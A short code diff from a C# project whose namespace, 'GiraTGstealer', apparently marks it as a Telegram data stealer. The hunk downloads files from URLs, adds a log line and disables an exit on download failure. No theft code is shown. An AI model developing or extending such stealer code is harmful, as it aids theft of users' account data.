@@ -14,11 +14,12 @@ namespace GiraTGstealer
                 {
                     WebClient client = new WebClient();
                     client.DownloadFile(url, Path.GetFileName(url));
+                    Console.WriteLine($"[+] {url}");
                 }
                 catch (WebException)
                 {
                     Console.WriteLine("Failed to load libraries");
-                    Environment.Exit(1);
+                    //Environment.Exit(1);
                 }
             }
         }
